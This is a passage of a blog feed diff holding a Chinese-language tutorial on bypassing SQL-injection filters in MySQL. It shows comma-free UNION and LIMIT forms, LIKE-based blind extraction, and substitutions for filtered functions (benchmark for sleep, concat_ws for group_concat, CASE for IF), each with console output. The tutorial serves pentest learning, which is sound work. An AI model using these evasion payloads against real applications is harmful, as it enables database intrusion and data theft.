+|  1 | 2        | 3        |
++----+----------+----------+
+123456789
+</code></pre>
+<p>其中的</p>
+<pre><code class="language-sql">union select * from (select 1)a join (select 2)b join(select 3)c
+</code></pre>
+<p>等价于</p>
+<pre><code class="language-sql">union select 1,2,3
+</code></pre>
+<ul>
+<li>使用<code>like</code>关键字<br>
+适用于<code>substr()</code>等提取子串的函数中的逗号</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select ascii(substr(user(),1,1))=114;
++-------------------------------+
+| ascii(substr(user(),1,1))=114 |
++-------------------------------+
+|                             1 |
++-------------------------------+
+
+mysql&gt; select user() like &quot;r%&quot;;
++------------------+
+| user() like &quot;r%&quot; |
++------------------+
+|                1 |
++------------------+
+
+mysql&gt; select user() like &quot;t%&quot;;
++------------------+
+| user() like &quot;t%&quot; |
++------------------+
+|                0 |
++------------------+
+1234567891011121314151617181920
+</code></pre>
+<ul>
+<li>使用offset关键字<br>
+适用于<code>limit</code>中的逗号被过滤的情况<br>
+<code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users limit 2,1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  3 | test3    | pass1    |
++----+----------+----------+
+
+mysql&gt; select * from users limit 1 offset 2;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  3 | test3    | pass1    |
++----+----------+----------+
+12345678910111213
+</code></pre>
+<h3 id="过滤函数绕过">过滤函数绕过</h3>
+<ul>
+<li>sleep() --&gt;benchmark()</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select 12,23 and sleep(1);
++----+-----------------+
+| 12 | 23 and sleep(1) |
++----+-----------------+
+| 12 |               0 |
++----+-----------------+
+1 row in set (1.00 sec)
+1234567
+# MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 
+参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
+mysql&gt; select 12,23 and benchmark(1000000000,1);
++----+--------------------------------+
+| 12 | 23 and benchmark(1000000000,1) |
++----+--------------------------------+
+| 12 |                              0 |
++----+--------------------------------+
+1 row in set (4.61 sec)
+123456789
+</code></pre>
+<ul>
+<li>ascii()–&gt;hex()、bin()<br>
+替代之后再使用对应的进制转string即可</li>
+<li>group_concat()–&gt;concat_ws()</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select group_concat(&quot;str1&quot;,&quot;str2&quot;);
++-----------------------------+
+| group_concat(&quot;str1&quot;,&quot;str2&quot;) |
++-----------------------------+
+| str1str2                    |
++-----------------------------+
+1 row in set (0.00 sec)
+
+#第一个参数为分隔符
+mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);
++------------------------------+
+| concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) |
++------------------------------+
+| str1,str2                    |
++------------------------------+
+123456789101112131415
+</code></pre>
+<ul>
+<li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li>
+<li>user() --&gt; @@user、datadir–&gt;@@datadir</li>
+<li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li>
+</ul>
+<h3 id="过滤if函数绕过">过滤IF函数绕过</h3>
+<pre><code>case sex  when '1' then '男'  when '2' then '女’  else '其他' end
+</code></pre>
+<p>https://bbs.ichunqiu.com/thread-60004-1-1.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透]]></title>
         <id>https://Jrand-github.github.io/post/wen-dang-nei-wang-shen-tou/</id>
         <link href="https://Jrand-github.github.io/post/wen-dang-nei-wang-shen-tou/">
         </link>
